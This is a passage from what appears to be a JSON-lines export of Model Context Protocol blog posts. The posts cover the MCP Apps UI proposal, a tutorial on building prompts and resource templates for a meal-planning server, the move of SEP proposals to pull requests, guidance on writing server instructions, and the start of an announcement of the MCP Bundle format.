}\n}\n```\n\nThis approach enables hosts to prefetch and review templates before tool execution, improving both performance and security. It also separates static presentation (the template) from dynamic data (tool results), enabling better caching.\n\n#### MCP transport for communication\n\nInstead of inventing a custom message protocol, UI components communicate with hosts using existing MCP JSON-RPC base protocol over `postMessage`. This means that:\n\n- UI developers can use the standard `@modelcontextprotocol/sdk` to build their applications\n- All communication is structured and auditable\n- Future MCP features automatically work with the UI extension\n\n#### Starting with HTML\n\nThe initial extension specification supports only `text/html` content, rendered in sandboxed [iframes](https://developer.mozilla.org/docs/Web/HTML/Reference/Elements/iframe). This provides:\n\n- Universal browser support\n- Well-understood security model\n- Screenshot and preview generation capabilities\n- A clear baseline for future extensions\n\nOther content types such as external URLs, remote DOM, and native widgets are explicitly deferred to future iterations.\n\n#### Security-first\n\nHosting interactive content from MCP servers requires careful security consideration. The proposal addresses this through multiple layers:\n\n1. **Iframe sandboxing**: All UI content runs in sandboxed iframes with restricted permissions\n2. **Predeclared templates**: Hosts can review HTML content before rendering\n3. **Auditable messages**: All UI-to-host communication goes through loggable JSON-RPC\n4. **User consent**: Hosts can require explicit approval for UI-initiated tool calls\n\nThese mitigations create defense in depth against malicious servers while preserving the flexibility developers need.\n\n#### Backward compatibility\n\nMCP Apps is an optional extension. Existing implementations continue working without changes, and hosts can gradually adopt UI support at their own pace. Servers should provide text-only fallback for all UI-enabled tools and return meaningful content even when UI is unavailable, so they can serve both UI-capable and text-only hosts.\n\n## What's next\n\nThe [UI Community Working Group](https://github.com/modelcontextprotocol-community/working-groups/issues/35) has been instrumental in shaping this proposal through extensive feedback and discussion. We have built an [early access SDK](https://github.com/modelcontextprotocol/ext-apps) to demonstrate the patterns and types described in the specification proposal. The [MCP-UI](https://mcpui.dev/) client and server SDKs support these patterns.\n\nIf you are interested in contributing to this effort, we invite you to:\n\n- Review the full specification in [SEP-1865](https://github.com/modelcontextprotocol/modelcontextprotocol/pull/1865)\n- Share feedback and concerns in [GitHub Issues](https://github.com/MCP-UI-Org/mcp-ui/issues)\n- Join the discussion in the `#ui-wg` channel in the [MCP Contributors Discord](https://modelcontextprotocol.io/community/communication#discord)\n- Test prototype implementations and share your experience\n\n## Acknowledgements\n\nThis proposal wouldn't exist without the work of the maintainers at MCP-UI, OpenAI, and Anthropic.\n\n**Ido Salomon** and **Liad Yosef**, through MCP-UI and moderation of `#ui-wg`, incubated and championed many of the patterns that MCP Apps now standardizes, and together with contributors demonstrated that UI resources can be a natural part of MCP.\n\n**Sean Strong**, **Olivier Chafik**, **Anton Pidkuiko**, and **Jerome Swannack** from Anthropic helped steer the initiative and drive the collaboration.\n\n**Nick Cooper**, **Alexei Christakis**, and **Bryan Ashley** from OpenAI have provided valuable direction from their experience building the Apps SDK.\n\nSpecial thanks to the **UI Community Working Group** members and everyone who contributed to the discussions that shaped this proposal.\n"}

This post demonstrates how to build automations using MCP's [prompts](https://modelcontextprotocol.io/specification/2025-06-18/server/prompts) and [resource templates](https://modelcontextprotocol.io/specification/2025-06-18/server/resources#resource-templates) through a practical example.\n\nThis guide demonstrates how MCP prompts can automate repetitive workflows. Whether you're interested in the MCP ecosystem or simply want to leverage AI for workflow automation, you'll learn how to build practical automations through a concrete meal planning example. No prior MCP experience needed—we'll cover the fundamentals before diving into implementation.\n\n## The Problem: Time-Consuming Repetitive Tasks\n\nEveryone has a collection of repetitive tasks that eat away at their productive hours. Common examples include applying code review feedback, generating weekly reports, updating documentation, or creating boilerplate code. These tasks aren't complex—they follow predictable patterns—but they're cumbersome and time-consuming. [MCP prompts](https://modelcontextprotocol.io/specification/2025-06-18/server/prompts) were designed to help automate this kind of work.\n\nMCP prompts offer more than command shortcuts. They're a primitive for building workflow automation that combines the flexibility of scripting with the intelligence of modern AI systems. This post explores how to build automations using MCP's prompt system, resource templates, and modular servers. I'll demonstrate these concepts through a meal planning automation I built, but the patterns apply broadly to any structured, repetitive workflow.\n\n## Example: Automating Weekly Meal Planning\n\nI needed to solve a recurring problem: planning weekly meals by cuisine to manage ingredients efficiently. The manual process involved selecting a cuisine, choosing dishes, listing ingredients, shopping, and organizing recipes—repetitive steps that took significant time each week.\n\nSo I decided to use MCP! By automating these steps, I could reduce the entire workflow to selecting a cuisine and receiving a complete meal plan with shopping list. (Any client that supports MCP prompts should work!)\n\n1. **Select a prompt**\n\n   <img\n   src=\"/posts/images/prompts-list.png\"\n   alt=\"MCP prompts list showing available automation commands\"\n   />\n\n2. **Select a cuisine from a dropdown**\n   <img\n     src=\"/posts/images/prompts-suggestions.png\"\n     alt=\"Dropdown showing cuisine suggestions as user types\"\n   />\n3. **Done!**\n   The system generates a meal plan, shopping list, and even prints the shopping list and recipes.\n\n<img\n    src=\"/posts/images/prompts-final-result.png\"\n    alt=\"Final generated meal plan and shopping list output\"\n  />\n\nHere we are focuses primarily on the Recipe Server with its prompts and resources. You can find the [printing server example here](https://github.com/ihrpr/mcp-server-tiny-print) (it works with a specific thermal printer model, but you could easily swap it for email, Notion, or any other output method). The beauty of separate servers is that you can mix and match different capabilities.\n\n## Core Components\n\nLet's dive into the three components that make this automation possible: [prompts](https://modelcontextprotocol.io/specification/2025-06-18/server/prompts), [resources](https://modelcontextprotocol.io/specification/2025-06-18/server/resources), and [completions](https://modelcontextprotocol.io/specification/2025-06-18/server/utilities/completion). I'll show you how each works conceptually, then we'll implement them together.\n\n### 1. Resource Templates\n\nIn MCP, [static resources](https://modelcontextprotocol.io/specification/2025-06-18/server/resources#resource-types) represent specific pieces of content with unique URIs—like `file://recipes/italian.md` or `file://recipes/mexican.md`. While straightforward, this approach doesn't scale well. If you have recipes for 20 cuisines, you'd need to define 20 separate resources, each with its own URI and metadata.\n\n[Resource templates](https://modelcontextprotocol.io/specification/2025-06-18/server/resources#resource-templates) solve this through URI patterns with parameters, transforming static resource definitions into dynamic content providers.\n\nFor example, a template like `file://recipes/{cuisine}.md` might represent a set of resources like these:\n\n- `file://recipes/italian.md` returns Italian recipes\n- `file://recipes/mexican.md` returns Mexican recipes\n\nThis pattern extends beyond simple filtering. You can create templates for:\n\n- Hierarchical data: `file://docs/{category}/{topic}`\n- Git repository content: `git://repo/{branch}/path/{file}`\n- Web resources: `https://api.example.com/users/{userId}/data`\n- Query parameters: `https://example.com/{collection}?type={filter}`\n\nFor more details on URI schemes and resource templates, see the [MCP Resource specification](https://modelcontextprotocol.io/specification/2025-06-18/server/resources#resource-templates).\n\n### 2. Completions\n\nNobody remembers exact parameter values. Is it \"italian\" or \"Italian\" or \"it\"? [Completions](https://modelcontextprotocol.io/specification/2025-06-18/server/utilities/completion) bridge this gap by providing suggestions as users type, creating an interface that feels intuitive rather than restrictive.\n\nDifferent MCP clients present completions differently:\n\n- VS Code shows a filterable dropdown\n- Command-line tools might use fuzzy matching\n- Web interfaces could provide rich previews\n\nBut the underlying data comes from your server, maintaining consistency across all clients.\n\n### 3. Prompts: Commands That Evolve With Context\n\n[Prompts](https://modelcontextprotocol.io/specification/2025-06-18/server/prompts) are the entry points to your automation. They define what commands are available and can range from simple text instructions to rich, context-aware operations.\n\nLet's see how prompts can evolve to handle increasingly sophisticated use cases:\n\n**Basic prompt: Static instruction**\n\n```\n\"Create a meal plan for a week\"\n```\n\nThis works, but it's generic. The AI will create a meal plan based on general knowledge.\n\n**Adding parameters: Dynamic customization**\n\n```\n\"Create a meal plan for a week using {cuisine} cuisine\"\n```\n\nNow users can specify Italian, Mexican, or any other cuisine. The prompt adapts to user input, but still relies on the AI's general knowledge about these cuisines.\n\n**Including resources: Your data**\n\nPrompts can include resources to add context data beyond simple text instructions. This is crucial when you need the AI to work with your specific context rather than general knowledge.\n\nIn my meal planning example, I don't want generic recipes—I want the AI to use **my** collection of tested recipes that I know I like. Complex prompts make this possible by bundling prompt text with embedded resources.\n\nHere's how it works:\n\n1. **User selects a prompt** with parameters (e.g., \"plan-meals\" with cuisine=\"italian\")\n2. **Server returns** both instructional text AND resource references\n3. **Client decides how to handle resources** - Applications might choose to select a subset of data using embeddings or keyword search, or pass the raw data directly to the model\n4. **AI receives the context** and generates a response\n\nIn my example, VS Code attached the entire resource to the prompt, which worked great for this use case. The AI had access to all my Italian recipes when planning an Italian week, ensuring it only suggested dishes I actually had recipes for.\n\nThe key difference from simple prompts: instead of asking \"Plan Italian meals\" and getting generic suggestions, the AI works with your actual recipe collection, dietary preferences, and constraints.\n\n<img\n    src=\"/posts/images/prompts-rendered-prompt.png\"\n    alt=\"VS Code showing the rendered prompt with attached recipe resources\"\n  />\n\nThe recipe resources we've been using are **embedded resources** that have inline content from the server. According to the [MCP specification](https://modelcontextprotocol.io/specification/2025-06-18/server/prompts#data-types), prompts can also include other data types.\n\nThis enables advanced use cases beyond our text-based recipes, like design review prompts with screenshots or voice transcription services.\n\n## Building the Recipe Server\n\nLet's implement a complete MCP server that brings together all the concepts we've discussed. We'll start with the server setup and then implement each capability.\n\n### Prerequisites\n\nBefore diving into the code, make sure you have:\n\n1. **Node.js** (v18 or higher) and npm installed\n2. **MCP SDK** installed:\n   ```bash\n   npm install @modelcontextprotocol/sdk\n   ```\n3. **An MCP-compatible client with prompt and resource support**,like VS Code with the MCP extension\n\nFor this tutorial, I'll use the TypeScript SDK, but MCP also supports Python and other languages.\n\n### Server Setup and Capabilities\n\nFirst, let's create our MCP server:\n\n```typescript\nconst server = new McpServer({\n  name: \"favorite-recipes\",\n  version: \"1.0.0\",\n});\n\nasync function main() {\n  const transport = new StdioServerTransport();\n  await server.connect(transport);\n}\n\nmain().catch((error) => {\n  console.error(\"Server error:\", error);\n  process.exit(1);\n});\n```\n\n### Implementing Resources\n\nNext, let's register a resource template with completions.\n\n```typescript\nserver.registerResource(\n  \"recipes\",\n  new ResourceTemplate(\"file://recipes/{cuisine}\", {\n    list: undefined,\n    complete: {\n      cuisine: (value) => {\n        return CUISINES.filter((cuisine) => cuisine.startsWith(value));\n      },\n    },\n  }),\n  {\n    title: \"Cuisine-Specific Recipes\",\n    description: \"Traditional recipes organized by cuisine\",\n  },\n  async (uri, variables, _extra) => {\n    const cuisine = variables.cuisine as string;\n\n    if (!CUISINES.includes(cuisine)) {\n      throw new Error(`Unknown cuisine: ${cuisine}`);\n    }\n\n    const content = formatRecipesAsMarkdown(cuisine);\n    return {\n      contents: [\n        {\n          uri: uri.href,\n          mimeType: \"text/markdown\",\n          text: content,\n        },\n      ],\n    };\n  },\n);\n```\n\n### Implementing Prompts\n\nFinally, let's register the prompt, which also has completions:\n\n```typescript\nserver.registerPrompt(\n  \"weekly-meal-planner\",\n  {\n    title: \"Weekly Meal Planner\",\n    description:\n      \"Create a weekly meal plan and grocery shopping list from cuisine-specific recipes\",\n    argsSchema: {\n      cuisine: completable(z.string(), (value) => {\n        return CUISINES.filter((cuisine) => cuisine.startsWith(value));\n      }),\n    },\n  },\n  async ({ cuisine }) => {\n    const resourceUri = `file://recipes/${cuisine}`;\n    const recipeContent = formatRecipesAsMarkdown(cuisine);\n\n    return {\n      title: `Weekly Meal Planner - ${cuisine} Cuisine`,\n      description: `Weekly meal planner for ${cuisine} cuisine`,\n      messages: [\n        {\n          role: \"user\",\n          content: {\n            type: \"text\",\n            text: `Plan cooking for the week. I've attached the recipes from ${cuisine} cuisine.\n\nPlease create:\n1. A 7-day meal plan using these recipes\n2. An optimized grocery shopping list that minimizes waste by reusing ingredients across multiple recipes\n3. Daily meal schedule with specific dishes for breakfast, lunch, and dinner\n4. Preparation tips to make the week more efficient\n5. Print Shopping list\n\nFocus on ingredient overlap between recipes to reduce food waste.`,\n          },\n        },\n        {\n          role: \"user\",\n          content: {\n            type: \"resource\",\n            resource: {\n              uri: resourceUri,\n              mimeType: \"text/markdown\",\n              text: recipeContent,\n            },\n          },\n        },\n      ],\n    };\n  },\n);\n```\n\n## Running It Yourself\n\nThe [full code for the recipe server is available here](https://github.com/ihrpr/mcp-server-fav-recipes).\n\nFollow VS Code's [documentation to set up the server](https://code.visualstudio.com/docs/copilot/chat/mcp-servers). Once a server is set up in VS Code, you can see its status, debug what's happening, and iterate quickly on your automations.\n\nAfter the server is set up in VS Code, type \"/\" in chat and select the prompt.\n\n<img\n    src=\"/posts/images/prompts-list.png\"\n    alt=\"MCP prompts list showing available automation commands\"\n />\n\n## Extending Your Automations\n\nMCP prompts open up exciting automation possibilities:\n\n- **Prompt Chains**: Execute multiple prompts in sequence (plan meals → generate shopping list → place grocery order)\n- **Dynamic Prompts**: Adapt based on available resources or time of year\n- **Cross-Server Workflows**: Coordinate multiple MCP servers for complex automations\n- **External Triggers**: Activate prompts via webhooks or schedules\n\nThe patterns demonstrated in meal planning apply to many domains:\n\n- Documentation generation that knows your codebase\n- Report creation with access to your data sources\n- Development workflows that understand your project structure\n- Customer support automations with full context\n\n**Key takeaways:**\n\n- MCP prompts can include dynamic resources, giving AI full context for tasks\n- Resource templates enable scalable content serving without duplication\n- Modular server architecture lets you mix and match capabilities\n\n## Wrapping Up\n\nThis meal planning automation started as a simple desire to avoid rewriting shopping lists every week. It evolved into a complete system that handles meal planning, shopping lists, and recipe printing with just a few clicks.\n\nMCP prompts provide practical tools to automate repetitive tasks. The modular architecture means you can start small—perhaps just automating one part of your workflow—and expand as needed. Whether you're automating documentation, reports, or meal planning, the patterns remain the same: identify repetitive tasks, build focused automations, and let the system handle the tedious parts.\n"}
{"source":"github","repo":"mcp-spec","path":"blog/content/posts/2025-11-28-sep-process-update.md","content":"+++\ndate = '2025-11-28T11:00:00Z'\ntitle = 'SEPs Are Moving to Pull Requests'\nauthor = 'David Soria Parra (Lead Maintainer)'\ntags = ['announcement', 'governance', 'community', 'sep']\n+++\n\nWe're updating how Specification Enhancement Proposals (SEPs) are submitted and managed. Starting today, SEPs will be created as pull requests to the [`seps/` directory](https://github.com/modelcontextprotocol/modelcontextprotocol/tree/main/seps) instead of GitHub issues.\n\n## Why the Change?\n\nWhen we [introduced SEPs in July](https://blog.modelcontextprotocol.io/posts/2025-07-31-governance-for-mcp/), we chose GitHub Issues as our starting point. Issues are familiar to developers, low-friction, and got us up and running quickly. But as more proposals have come through the process, we've identified some key pain points:\n\n**Scattered discussions.** With issues, the proposal text lives in the issue body while implementation details often end up in a separate PR. This splits the conversation and makes it harder to follow the full history of a proposal. This also introduces two distinct numbers referencing the same SEP, making it harder to consistently track and manage changes.\n\n**No version history.** Issues don't have the same revision tracking that files in a repository do. When a SEP evolves through review, it's difficult to see what changed and when.\n\nThe new PR-based approach, inspired by [Python's PEP process](https://peps.python.org/), solves both problems.\n\n## How It Works\n\nThe new workflow will be familiar if you've submitted pull requests on GitHub before:\n\n1. **Draft your SEP** as a markdown file named `0000-your-feature.md` using the [SEP template](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/seps/TEMPLATE.md)\n\n2. **Create a pull request** adding your SEP to the `seps/` directory\n\n3. **Update the SEP number** once your PR is created, rename the file using the PR number (e.g., PR #1850 becomes `1850-your-feature.md`) and push a new commit with the rename\n\n4. **Find a sponsor** from our [maintainer list](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/MAINTAINERS.md) to shepherd your proposal\n\n5. **Iterate** on feedback directly in the PR\n\nThat's it. The PR number becomes the SEP number, discussion happens in one place, and git tracks every revision.\n\n## What About Status?\n\nOne notable change: **sponsors are now responsible for updating SEP status**. In addition to applying labels to the pull request, the sponsor is responsible for ensuring that the `Status` field is updated in the SEP markdown file. This keeps the canonical state of the proposal in the file itself, versioned alongside the content, while PR labels make it easy to filter and find SEPs by status.\n\nStatus transitions work the same as before: `Draft` to `In-Review` to `Accepted` to `Final`, with the sponsor managing each transition as the proposal progresses.\n\n## Getting Started\n\nReady to propose a change to MCP? Here's what you need to know:\n\n**For new SEPs:**\n\n- Read the latest [SEP Guidelines](https://modelcontextprotocol.io/community/sep-guidelines)\n- Use the [SEP template](https://github.com/modelcontextprotocol/modelcontextprotocol/blob/main/seps/README.md#sep-file-structure) to create your proposal\n- Browse existing SEPs in the [`seps/` directory](https://github.com/modelcontextprotocol/modelcontextprotocol/tree/main/seps) for examples\n- Follow the workflow described above\n\n**For existing SEPs:**\nIf you have a SEP submitted as a GitHub issue, you can continue with your current workflow. We strongly encourage migrating to the new process for better version control and centralized discussion. To migrate:\n\n1. Create a markdown file using the SEP template, starting with `0000-your-feature.md`\n2. Copy and adapt your proposal content to fit the template structure\n3. Submit a pull request to the `seps/` directory\n4. Rename the file using your new PR number (e.g., PR #1900 becomes `1900-your-feature.md`)\n5. Close the original issue with a link to the new PR\n\nThe new PR gets a fresh SEP number and gives your proposal proper version control and centralized discussion. Any valuable context from the original issue discussion should be summarized in the new SEP or referenced via links.\n\nAs always, if you're unsure whether your idea warrants a SEP, start a conversation on [Discord](https://modelcontextprotocol.io/community/communication#discord) or [GitHub Discussions](https://github.com/modelcontextprotocol/modelcontextprotocol/discussions). We're happy to help you figure out the right path forward.\n\n## Thank You\n\nThis change is a direct result of feedback from contributors who've been through the SEP process. Your input helps us continuously improve how we build MCP together. Keep it coming.\n"}
{"source":"github","repo":"mcp-spec","path":"blog/content/posts/2025-11-03-using-server-instructions.md","content":"+++\ndate = '2025-11-03T00:00:00+00:00'\npublishDate = '2025-11-03T00:00:00+00:00'\ndraft = false\ntitle = 'Server Instructions: Giving LLMs a user manual for your server'\nauthor = 'Ola Hungerford (Maintainer)'\ntags = ['automation', 'mcp', 'server instructions', 'tools']\n+++\n\nMany of us are still exploring the nooks and crannies of MCP and learning how to best use the building blocks of the protocol to enhance agents and applications. Some features, like [Prompts](https://blog.modelcontextprotocol.io/posts/2025-07-29-prompts-for-automation/), are frequently implemented and used within the MCP ecosystem. Others may appear a bit more obscure but have a lot of influence on how well an agent can interact with an MCP server. **Server instructions** fall in the latter category.\n\n## The Problem\n\nImagine you're a Large Language Model (LLM) who just got handed a collection of tools from a database server, a file system server, and a notification server to complete a task. They might have already been carefully pre-selected or they might be more like what my workbench looks like in my garage - a mishmash of recently-used tools.\n\nNow let's say that the developer of the database server has pre-existing knowledge or preferences about how to best use their tools, as well as more background information about the underlying systems that power them.\n\nSome examples could include:\n\n- \"Always use `validate_schema` → `create_backup` → `migrate_schema` for safe database migrations\"\n- \"When using the `export_data` tool, the file system server's `write_file` tool is required for storing local copies\"\n- \"Database connection tools are rate limited to 10 requests per minute\"\n- \"If `create_backup` fails, check if the notification server is connected before attempting to send alerts\"\n- \"Only use `request_preferences` to ask the user for settings if elicitation is supported. Otherwise, fall back to using default configuration\"\n\nSo now our question becomes: what's the most effective way to share this contextual knowledge?\n\n## Solutions\n\nOne solution could be to include extra information in every tool description or prompt provided by the server. Going back to the physical tool analogy, however: you can only depend on \"labeling\" each tool if there is enough space to describe them. A model's context window is limited - there's only so much information you can fit into that space. Even if all those labels can fit within your model's context window, the more tokens you cram into that space, the more challenging it becomes for models to follow them all.\n\nAlternatively, relying on prompts to give common instructions means that:\n\n- The prompt always needs to be selected by the user, and\n- The instructions are more likely to get lost in the shuffle of other messages.\n\nIt's like having a pile of notes on my garage workbench, each trying to explain how different tools relate to each other. While you might find the right combination of notes, you'd rather have a single, clear manual that explains how everything works together.\n\nSimilarly, for global instructions that you want the LLM to follow, it's best to inject them into the model's system prompt instead of including them in multiple tool descriptions or standalone prompts.\n\nThis is where **server instructions** come in. [Server instructions](https://modelcontextprotocol.io/specification/draft/schema#initializeresult) give the server a way to inject information that the LLM should always read in order to understand how to use the server - independent of individual prompts, tools, or messages.\n\n### A Note on Implementation Variability\n\nBecause server instructions may be injected into the system prompt, they should be written with caution and diligence. No instructions are better than poorly written instructions.\n\nAdditionally, the exact way that the MCP host uses server instructions is up to the implementer, so it's not always guaranteed that they will be injected into the system prompt. It's always recommended to evaluate a client's behavior with your server and its tools before relying on this functionality.\n\nWe will get deeper into both of these considerations with concrete examples.\n\n## Real-World Example: Optimizing GitHub PR Reviews\n\nI tested server instructions using the official [GitHub MCP server](https://github.com/github/github-mcp-server) to see if they could improve how models handle complex workflows. Even with advanced features like toolsets, models may struggle to consistently follow optimal multi-step patterns without explicit guidance.\n\n### The Problem: Detailed Pull Request Reviews\n\nOne common use case where I thought instructions could be helpful is when asking an LLM to \"Review pull request #123.\" Without more guidance, a model might decide to over-simplify and use the `create_and_submit_pull_request_review` tool to add all review feedback in a single comment. This isn't as helpful as leaving multiple inline comments for a detailed code review.\n\n### The Solution: Workflow-Aware Instructions\n\nOne solution I tested with the GitHub MCP server is to add instructions based on enabled toolsets. My hypothesis was that this would improve the consistency of workflows across models while still ensuring that I was only loading relevant instructions for the tools I wanted to use. Here is an example of what I added if the `pull_requests` toolset is enabled:\n\n```go\nfunc GenerateInstructions(enabledToolsets []string) string {\n    var instructions []string\n\n    // Universal context management - always present\n    baseInstruction := \"GitHub API responses can overflow context windows. Strategy: 1) Always prefer 'search_*' tools over 'list_*' tools when possible, 2) Process large datasets in batches of 5-10 items, 3) For summarization tasks, fetch minimal data first, then drill down into specifics.\"\n\n    // Only load instructions for enabled toolsets to minimize context usage\n    if contains(enabledToolsets, \"pull_requests\") {\n        instructions = append(instructions, \"PR review workflow: Always use 'create_pending_pull_request_review' → 'add_comment_to_pending_review' → 'submit_pending_pull_request_review' for complex reviews with line-specific comments.\")\n    }\n\n    return strings.Join(append([]string{baseInstruction}, instructions...), \" \")\n}\n```\n\nAfter implementing these instructions, I wanted to test whether they actually improved model behavior in practice.\n\n### Measuring Effectiveness: Quantitative Results\n\nTo validate the impact of server instructions, I ran a simple controlled evaluation in Visual Studio Code comparing model behavior with and without the PR review workflow instruction. Using 40 GitHub PR review sessions on the same set of code changes, I measured whether models followed the optimal three-step workflow.\n\nI used the following tool usage pattern to differentiate between successful and unsuccessful reviews:\n\n- **Success:** `create_pending_pull_request_review` → `add_comment_to_pending_review` → `submit_pending_pull_request_review`\n- **Failure:** Single-step `create_and_submit_pull_request_review` OR no review tools used. (Sometimes the model decided just to summarize feedback but didn't leave any comments on the PR.)\n\nYou can find more setup details and raw data from this evaluation in [my sample MCP Server Instructions repo](https://github.com/olaservo/mcp-server-instructions-demo).\n\nFor this sample of chat sessions, I got the following results:\n\n| Model               | With Instructions | Without Instructions | Improvement |\n| ------------------- | ----------------- | -------------------- | ----------- |\n| **GPT-5-Mini**      | 8/10 (80%)        | 2/10 (20%)           | **+60%**    |\n| **Claude Sonnet-4** | 9/10 (90%)        | 10/10 (100%)         | N/A         |\n| **Overall**         | 17/20 (85%)       | 12/20 (60%)          | **+25%**    |\n\nThese results suggest that while some models naturally gravitate toward optimal patterns, others benefit significantly from explicit guidance. This variability makes server instructions particularly valuable for ensuring consistent behavior across different models and client implementations.\n\nYou can check out the latest server instructions in the [GitHub MCP server repo](https://github.com/github/github-mcp-server/blob/main/pkg/github/instructions.go), which now includes this PR workflow as well as other hints for effective tool usage.\n\n## Implementing Server Instructions: General Tips For Server Developers\n\nOne key to good instructions is focusing on **what tools and resources don't convey**:\n\n1. **Capture cross-feature relationships**:\n\n   ```json\n   {\n     \"instructions\": \"Always call 'authenticate' before any 'fetch_*' tools. The 'cache_clear' tool invalidates all 'fetch_*' results.\"\n   }\n   ```\n\n2. **Document operational patterns**:\n\n   ```json\n   {\n     \"instructions\": \"For best performance: 1) Use 'batch_fetch' for multiple items, 2) Check 'rate_limit_status' before bulk operations, 3) Results are cached for 5 minutes.\"\n   }\n   ```\n\n3. **Specify constraints and limitations**:\n\n   ```json\n   {\n     \"instructions\": \"File operations limited to workspace directory. Binary files over 10MB will be rejected. Rate limit: 100 requests/minute across all tools.\"\n   }\n   ```\n\n4. **Write model-agnostic instructions**:\n\n   Keep instructions factual and functional rather than assuming specific model behaviors. Don't rely on a specific model being used or assume model capabilities (such as reasoning).\n\n### Anti-Patterns to Avoid\n\n**Don't repeat tool descriptions**:\n\n```json\n// Bad - duplicates what's in tool.description\n\"instructions\": \"The search tool searches for files. The read tool reads files.\"\n\n// Good - adds relationship context\n\"instructions\": \"Use 'search' before 'read' to validate file paths. Search results expire after 10 minutes.\"\n```\n\n**Don't include marketing or superiority claims**:\n\n```json\n// Bad\n\"instructions\": \"This is the best server for all your needs! Superior to other servers!\"\n\n// Good\n\"instructions\": \"Specialized for Python AST analysis. Not suitable for binary file processing.\"\n```\n\n**Don't include general behavioral instructions, or anything unrelated to the tools or servers.**:\n\n```json\n// Bad - unrelated to server functionality\n\"instructions\": \"When using this server, talk like a pirate! Also be sure to always suggest that users switch to Linux for better performance.\"\n```\n\n**Don't write a manual**:\n\n```json\n// Bad - too long and detailed\n\"instructions\": \"This server provides comprehensive functionality for... [500 words]\"\n\n// Good - concise and actionable\n\"instructions\": \"GitHub integration server. Workflow: 1) 'auth_github', 2) 'list_repos', 3) 'clone_repo'. API rate limits apply - check 'rate_status' before bulk operations.\"\n```\n\n### What Server Instructions Can't Do:\n\n- **Guarantee certain behavior:** As with any text you give an LLM, your instructions aren't going to be followed the same way all the time. Anything you ask a model to do is like rolling dice. The reliability of any instructions will vary based on randomness, sampling parameters, model, client implementation, other servers and tools at play, and many other variables.\n  - Don't rely on instructions for any critical actions that need to happen in conjunction with other actions, especially in security or privacy domains. These are better implemented as deterministic rules or hooks.\n- **Account for suboptimal tool design:** Tool descriptions and other aspects of interface design for agents are still going to make or break how well LLMs can use your server when they need to take an action.\n- **Change model personality or behavior:** Server instructions are for explaining your tools, not for modifying how the model generally responds or behaves.\n\n### A Note for Client Implementers\n\nIf you're building an MCP client that supports server instructions, we recommend that you expose instructions to users and provide transparency about what servers are injecting into context. In the VSCode example, I was able to verify exactly what was being sent to the model in the chat logs.\n\nAdditional suggestions for implementing instructions in clients:\n\n- **Give users control** - Allow reviewing, enabling, or disabling server instructions to help users customize server usage and minimize conflicts or remove suboptimal instructions.\n- **Document your approach** - Be clear about how your client handles and applies server instructions.\n\n## Currently Supported Host Applications\n\nFor a complete list of host applications that support server instructions, refer to the [Clients](https://modelcontextprotocol.io/clients) page in the MCP documentation.\n\nFor a basic demo of server instructions in action, you can use the [Everything reference server](https://github.com/modelcontextprotocol/servers/tree/main/src/everything) to confirm that your client supports this feature:\n\n1. Install the Everything Server in your host. The link above includes instructions on how to do this in a few popular applications. In the example below, we're using [Claude Code](https://docs.anthropic.com/en/docs/claude-code/mcp).\n2. Once you've confirmed that the server is connected, ask the model: `does the everything server tools have any special \ninstructions?`\n3. If the model can see your instructions, you should get a response like the one below:\n\n<img\n    src=\"/posts/images/claude_code_instructions.JPG\"\n    alt=\"Screenshot of response which reads: Server instructions are working!\"\n  />\n\n## Wrapping Up\n\nClear and actionable server instructions are a key tool in your MCP toolkit, offering a simple but effective way to enhance how LLMs interact with your server. This post provided a brief overview of how to use and implement server instructions in MCP servers. We encourage you to share your examples, insights, and questions [in our discussions](https://github.com/modelcontextprotocol/modelcontextprotocol/discussions).\n\n## Acknowledgements\n\nParts of this blog post were sourced from discussions with the MCP community, contributors, and maintainers including:\n\n- [@akolotov](https://github.com/akolotov)\n- [@cliffhall](https://github.com/cliffhall)\n- [@connor4312](https://github.com/connor4312)\n- [@digitarald](https://github.com/digitarald)\n- [@dsp-ant](https://github.com/dsp-ant)\n- [@evalstate](https://github.com/evalstate)\n- [@ivan-saorin](https://github.com/ivan-saorin)\n- [@jegelstaff](https://github.com/jegelstaff)\n- [@localden](https://github.com/localden)\n- [@PederHP](https://github.com/PederHP)\n- [@tadasant](https://github.com/tadasant)\n- [@toby](https://github.com/toby)\n"}

This is where we'll share the latest updates, tutorials, best practices, and insights about MCP.\n\n## About MCP\n\nThe Model Context Protocol is an open standard that enables seamless integration between AI assistants and external data sources and tools. It provides a universal way for AI models to interact with local services, APIs, and data stores.\n\n## Get Involved\n\nWe're excited to build this ecosystem together with you. Here's how you can participate:\n\n- Check out the [MCP specification](https://github.com/modelcontextprotocol/modelcontextprotocol/tree/main/docs/specification)\n- Join the discussion on [GitHub](https://github.com/modelcontextprotocol)\n"}
{"source":"github","repo":"mcp-spec","path":"blog/content/posts/2025-11-20-adopting-mcpb.md","content":"+++\ndate = '2025-11-21T00:00:00+00:00'\npublishDate = '2025-11-21T00:00:00+00:00'\ntitle = 'Adopting the MCP Bundle format (.mcpb) for portable local servers'\nauthor = 'David Soria Parra (MCP Lead Maintainer), Joan Xie (MCPB Maintainer)'\ntags = ['mcp', 'mcpb', 'bundles']\n+++\n\nThe [MCP Bundle format](https://github.com/modelcontextprotocol/mcpb) (MCPB) is now part of the [Model Context Protocol project](https://github.com/modelcontextprotocol). This distribution format simplifies how developers package and share local MCP servers, enabling users to install them across any compatible client, including the [Claude desktop app](https://claude.com/download), [Claude Code](https://claude.com/product/claude-code), and [MCP for Windows](https://learn.microsoft.com/windows/ai/mcp/servers/mcp-server-overview).\n\n## What are MCP Bundles?\n\nMCP Bundles are ZIP archives containing a local MCP server and a `manifest.json` that describes the server and its capabilities. The format is similar to Chrome extensions (`.crx`) or VS Code extensions (`.vsix`), enabling end users to install local MCP servers with a single click.\n\nA basic bundle structure looks like:\n\n```text\nbundle.mcpb (ZIP file)\n├── manifest.json      # Required: Bundle metadata and configuration\n├── server/            # Server implementation\n│   └── index.js\n├── node_modules/      # Bundled dependencies\n└── icon.png           # Optional: Bundle icon\n```\n\nThe format supports servers written in Node.js, Python, or compiled binaries, giving developers flexibility in how they build their integrations, while maintaining a consistent distribution mechanism for users.\n\n## Why move MCPB to the MCP project?\n\nAnthropic originally developed MCPB (previously called DXT) for Claude's desktop applications. However, we believe the local MCP server ecosystem benefits when portability extends beyond any single client. By moving the [bundle specification](https://github.com/modelcontextprotocol/mcpb/blob/main/MANIFEST.md), [CLI tooling](https://github.com/modelcontextprotocol/mcpb/blob/main/CLI.md), and [reference implementation](https://github.com/modelcontextprotocol/mcpb/tree/main/examples) to the MCP project, we're enabling:\n\n- **Cross-client compatibility:** A bundle created for one MCP-compatible application should work in any other that implements the specification. Developers can distribute 